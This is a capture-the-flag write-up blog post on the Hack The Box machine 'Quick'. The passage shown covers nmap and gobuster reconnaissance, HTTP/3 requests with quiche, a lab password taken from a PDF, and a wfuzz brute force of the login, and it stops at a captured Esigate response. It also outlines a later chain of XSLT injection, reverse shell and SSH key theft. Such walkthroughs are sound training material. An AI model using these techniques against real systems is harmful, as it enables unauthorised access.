@@ -1,0 +1,1071 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="This Box is currently in hackthbox active category , You can access the writeup only if you have either the Administrator user ntlm or the root user password hash from file /etc/shadow." /><meta property="og:title" content="Hackthebox Quick writeup" /><meta property="og:description" content="This Box is currently in hackthbox active category , You can access the writeup only if you have either the Administrator user ntlm or the root user password hash from file /etc/shadow." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/quick/quick.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Quick writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="This Box is currently in hackthbox active category , You can access the writeup only if you have either the Administrator user ntlm or the root user password hash from file /etc/shadow."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/quick/quick.png"><title>Hackthebox Quick writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Quick writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Quick writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Apr 30, 2020, 12:00 AM +0800" > Apr 30 <i class="unloaded">2020-04-30T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/quick.png" class="post-preview-img"><h1 id="informationquick">Information@quick:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Quick<tr><td>IP<td>10.10.10.186<tr><td>Points<td>40<tr><td>Os<td>Linux<tr><td>Difficulty<td>Hard<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/13531" target="_blank">MrR3boot</a><tr><td>Out On<td>25 April 2020</table></div><h1 id="briefquick">Brief@quick:~$</h1><p><code class="language-plaintext highlighter-rouge">Nmap</code> <em>udp</em> scan reveals a https:443 port that is running on <code class="language-plaintext highlighter-rouge">HTTP/3</code>.Using <code class="language-plaintext highlighter-rouge">quiche</code> to make a request to <code class="language-plaintext highlighter-rouge">quick.htb</code> gives us a pdf file and the pdf file contained a password.And a <code class="language-plaintext highlighter-rouge">WFUZZ</code> bruteforce gives us the right email from the custom email-list.After login to tcp port <code class="language-plaintext highlighter-rouge">9001</code>.Capturing the request give us a information about the <code class="language-plaintext highlighter-rouge">Esigate</code> on which the web-app is based.<strong>Exploiting</strong> the service with <code class="language-plaintext highlighter-rouge">XSLT-Injection</code>. Reading some internal files gives us information abt a <code class="language-plaintext highlighter-rouge">subdomain</code>.We got <code class="language-plaintext highlighter-rouge">private-ssh</code> keys for user <code class="language-plaintext highlighter-rouge">srvadm</code> by the printing <strong>functionality</strong>.And reviewing the <strong>~/.cache</strong> <code class="language-plaintext highlighter-rouge">dir</code>. We got file contains a url with has a <code class="language-plaintext highlighter-rouge">password</code> in it.Url-decode and login as root.</p><h1 id="summary">Summary</h1><ul><li>Installing <code class="language-plaintext highlighter-rouge">appropirate</code> packages and tools to access the <code class="language-plaintext highlighter-rouge">http3</code> protocol.<li>with <strong>cargo</strong> and <strong>quiche</strong> making a request to see the content of <strong>quick.htb:443</strong><li>Getting a <code class="language-plaintext highlighter-rouge">Connectivity.pdf</code>that contains a password.<li>Some guessing and by using <code class="language-plaintext highlighter-rouge">wfuzz</code> we got a valid <strong>email</strong><li>Logged-in to panel<li>Capturing the response for the ticket submission gives service name <code class="language-plaintext highlighter-rouge">ESIGATE</code><li>There is a public exploit available i.e. <code class="language-plaintext highlighter-rouge">XSLT-Injection</code><li>Exploiting that and getting a reverse connection as <strong>sam</strong>.<li>Got user.txt<li>Reading the file <code class="language-plaintext highlighter-rouge">db.php</code> gives us db-name,db-user,db-pass<li>Dumped the <strong>server-admin</strong> password and crack the <strong>hash</strong> using our custom php script.<li>The <code class="language-plaintext highlighter-rouge">apache-config </code>files give us a <code class="language-plaintext highlighter-rouge">subdomain</code><li>Port forward 80 and accessing the printer <code class="language-plaintext highlighter-rouge">services</code>.<li>Reading and analyze the code of <code class="language-plaintext highlighter-rouge">job.php</code> that is creating a file with name of timestamp.<li>Linking the file with <code class="language-plaintext highlighter-rouge">srvadm</code> private ssh-keys and getting its keys on <code class="language-plaintext highlighter-rouge">netcat</code> listener.<li>Logged in as <code class="language-plaintext highlighter-rouge">srvadm</code><li>The dir <strong>~/.cache</strong> contains some <code class="language-plaintext highlighter-rouge">dirs</code> and <code class="language-plaintext highlighter-rouge">files</code>.<li>There is a file called <code class="language-plaintext highlighter-rouge">/home/srvadm/.cache/conf.d/printers.conf</code> which contains a url<li>Decoding the url and we got password of user <code class="language-plaintext highlighter-rouge">root</code> in it and <strong>logged</strong> in as <strong>root</strong><li>Got root.txt</ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/quick.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap-tcp-all-ports">Nmap-Tcp all ports</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>➜  quick nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-p-</span> quick.htb <span class="nt">-oA</span> scans/nmap.full 
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-04-30 11:27 WIT
+Nmap scan report <span class="k">for </span>quick.htb <span class="o">(</span>10.10.10.186<span class="o">)</span>
+Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e <span class="o">(</span>ED25519<span class="o">)</span>
+9001/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Quick | Broadband Services
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>806.82 seconds
+</pre></table></code></div></div><h2 id="nmap-udp">Nmap-Udp</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>➜  quick nmap <span class="nt">-sU</span> quick.htb <span class="nt">-oA</span> scans/nmap.udp
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-04-30 11:48 WIT
+Stats: 0:06:42 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing UDP Scan
+UDP Scan Timing: About 41.05% <span class="k">done</span><span class="p">;</span> ETC: 12:04 <span class="o">(</span>0:09:37 remaining<span class="o">)</span>
+Warning: 10.10.10.186 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>quick.htb <span class="o">(</span>10.10.10.186<span class="o">)</span>
+Host is up <span class="o">(</span>0.22s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 999 closed ports
+PORT      STATE         SERVICE
+443/udp   open|filtered https
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1102.95 seconds
+</pre></table></code></div></div><p>We got three ports opened <code class="language-plaintext highlighter-rouge">22:ssh</code> , <code class="language-plaintext highlighter-rouge">9001:http</code> and a <strong>udp</strong> <code class="language-plaintext highlighter-rouge">https:443</code> port generally the <strong>https</strong> port That run on udp are <code class="language-plaintext highlighter-rouge">HTTP/3</code>.</p><h2 id="port-9001-">Port 9001 –</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-1.png" alt="port-9001" /></p><p>It is serving a broadband-service related web-app , and there is a login page too.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-2.png" alt="login-page" /></p><h2 id="gobuster-on-port-9001">Gobuster on port 9001:</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>➜  quick gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-r</span> <span class="nt">-k</span>   <span class="nt">-x</span> <span class="s2">"txt,html,php,asp,aspx,jpg"</span> <span class="nt">-u</span> http://quick.htb:9001/ 
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://quick.htb:9001/
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     asp,aspx,jpg,txt,html,php
+<span class="o">[</span>+] Follow Redir:   <span class="nb">true</span>
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/04/30 16:16:55 Starting gobuster
+<span class="o">===============================================================</span>
+/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/search.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/home.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/login.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/clients.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/db.php <span class="o">(</span>Status: 200<span class="o">)</span>
+</pre></table></code></div></div><p>There are so many files the file <code class="language-plaintext highlighter-rouge">db.php</code> obly have php code thats why its not rendering on the page.</p><h2 id="accessing-http3">Accessing HTTP/3</h2><p>For accessing the protocol HTTP/3 i am going to use <a href="https://github.com/cloudflare/quiche">Quiche</a>.</p><p>Follow the <code class="language-plaintext highlighter-rouge">instructions</code> to install it and it may require your some time to fulfil all the <strong>packages</strong> and <code class="language-plaintext highlighter-rouge">dependencies</code>. <code class="language-plaintext highlighter-rouge">cargo</code> and <code class="language-plaintext highlighter-rouge">rustc</code> are the main packages.</p><p>make a request using cargo on <strong>quick.htb</strong>.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre><td class="rouge-code"><pre>prashant@kali:/tmp/quiche$ cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify  https:/quick.htb/
+    Finished dev [unoptimized + debuginfo] target(s) in 0.22s
+     Running `tools/apps/target/debug/quiche-client --no-verify 'https:/quick.htb/'`
+
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;title&gt;</span> Quick | Customer Portal<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Quick | Portal<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;style&gt;</span>
+<span class="nt">ul</span> <span class="p">{</span>
+  <span class="nl">list-style-type</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
+  <span class="nl">margin</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
+  <span class="nl">padding</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
+  <span class="nl">width</span><span class="p">:</span> <span class="m">200px</span><span class="p">;</span>
+  <span class="nl">background-color</span><span class="p">:</span> <span class="m">#f1f1f1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nt">li</span> <span class="nt">a</span> <span class="p">{</span>
+  <span class="nl">display</span><span class="p">:</span> <span class="nb">block</span><span class="p">;</span>
+  <span class="nl">color</span><span class="p">:</span> <span class="m">#000</span><span class="p">;</span>
+  <span class="nl">padding</span><span class="p">:</span> <span class="m">8px</span> <span class="m">16px</span><span class="p">;</span>
+  <span class="nl">text-decoration</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c">/* Change the link color on hover */</span>
+<span class="nt">li</span> <span class="nt">a</span><span class="nd">:hover</span> <span class="p">{</span>
+  <span class="nl">background-color</span><span class="p">:</span> <span class="m">#555</span><span class="p">;</span>
+  <span class="nl">color</span><span class="p">:</span> <span class="no">white</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;p&gt;</span> Welcome to Quick User Portal<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;ul&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=contact"</span><span class="nt">&gt;</span>Contact<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=docs"</span><span class="nt">&gt;</span>References<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+<span class="nt">&lt;/ul&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></table></code></div></div><p>So there are so many files and we come to know about a pdf file called Connectivity.pdf and we come to know about it when we make a request to `</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>prashant@kali:/tmp/quiche$ cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify  https:/quick.htb/index.php?view=docs
+    Finished dev [unoptimized + debuginfo] target(s) in 0.34s
+     Running `tools/apps/target/debug/quiche-client --no-verify 'https:/quick.htb/index.php?view=docs'`
+prashant@kali:/tmp/quiche$ cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify  https:/quick.htb/index.php?view=docs
+    Finished dev [unoptimized + debuginfo] target(s) in 0.21s
+     Running `tools/apps/target/debug/quiche-client --no-verify 'https:/quick.htb/index.php?view=docs'`
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
+
+<span class="nt">&lt;h1&gt;</span>Quick | References<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;ul&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"docs/QuickStart.pdf"</span><span class="nt">&gt;</span>Quick-Start Guide<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"docs/Connectivity.pdf"</span><span class="nt">&gt;</span>Connectivity Guide<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+<span class="nt">&lt;/ul&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></table></code></div></div><p>We can make a <code class="language-plaintext highlighter-rouge">request</code> to the pdf and then save the <code class="language-plaintext highlighter-rouge">response</code> to a .pdf file</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>prashant@kali:/tmp/quiche<span class="nv">$ </span>cargo run <span class="nt">--manifest-path</span><span class="o">=</span>tools/apps/Cargo.toml <span class="nt">--bin</span> quiche-client <span class="nt">--</span> <span class="nt">--no-verify</span>  https:/quick.htb/docs/Connectivity.pdf <span class="o">&gt;&gt;</span> quick.pdf
+    Finished dev <span class="o">[</span>unoptimized + debuginfo] target<span class="o">(</span>s<span class="o">)</span> <span class="k">in </span>0.33s
+     Running <span class="sb">`</span>tools/apps/target/debug/quiche-client <span class="nt">--no-verify</span> <span class="s1">'https:/quick.htb/docs/Connectivity.pdf'</span><span class="sb">`</span>
+prashant@kali:/tmp/quiche<span class="nv">$ </span><span class="nb">ls
+</span>Cargo.lock  clippy.toml  COPYING  examples  fuzz     quiche.svg  quick.pdf  rustfmt.toml  target
+Cargo.toml  CODEOWNERS	 deps	  extras    include  quick1.pdf  README.md  src		  tools
+</pre></table></code></div></div><p>And after opening the pdf file in any <code class="language-plaintext highlighter-rouge">pdf</code> reader we can see there is a <strong>password</strong> in it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-3.png" alt="pdf-file" /></p><p>Password is : <code class="language-plaintext highlighter-rouge">Quick4cc3$$</code></p><p>And all we need a email or username to login on port 9001 now.</p><p>i grabbed all the usernames and email addresses from all the pages on quick.htb/ and make a wordlist on it.</p><p>Now i can use <code class="language-plaintext highlighter-rouge">wfuzz</code> to bruteforce the login .</p><h2 id="wfuzz-to-bruteforce-login">Wfuzz to bruteforce login</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>➜  quick wfuzz <span class="nt">-X</span> POST <span class="nt">-u</span> <span class="s1">'http://quick.htb:9001/login.php'</span> <span class="nt">-d</span> <span class="s1">'email=FUZZ&amp;password=Quick4cc3$$'</span> <span class="nt">-w</span> emaillist <span class="nt">--hc</span> 200 <span class="nt">-c</span>
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz documentation <span class="k">for </span>more information.
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 2.4 - The Web Fuzzer                           <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://quick.htb:9001/login.php
+Total requests: 62
+
+<span class="o">===================================================================</span>
+ID           Response   Lines    Word     Chars       Payload                                                                              
+<span class="o">===================================================================</span>
+
+000000062:   302        0 L      0 W      0 Ch        <span class="s2">"elisa@wink.co.uk"</span>                                                                   
+
+Total <span class="nb">time</span>: 2.267612
+Processed Requests: 62
+Filtered Requests: 61
+Requests/sec.: 27.34153
+</pre></table></code></div></div><p>And i was able to login on <code class="language-plaintext highlighter-rouge">quick.htb:9001/login.php</code> now.</p><h1 id="login-to-port-9001">Login to port 9001</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-4.png" alt="Login-to-9001" /></p><p>Okay so i m in there is a <code class="language-plaintext highlighter-rouge">/ticket.php</code> which just generate a <code class="language-plaintext highlighter-rouge">ticket-value</code> for us and a search.php which just search the tickets.</p><h2 id="exploiting-esigate-using-xslt-injection">Exploiting Esigate using XSLT-Injection</h2><p>if we capture the request of the hom.php itself with <code class="language-plaintext highlighter-rouge">burp</code>.</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Via</span><span class="p">:</span> <span class="s">1.1 localhost (Apache-HttpClient/4.5.2 (cache))</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">Esigate</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">9361</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
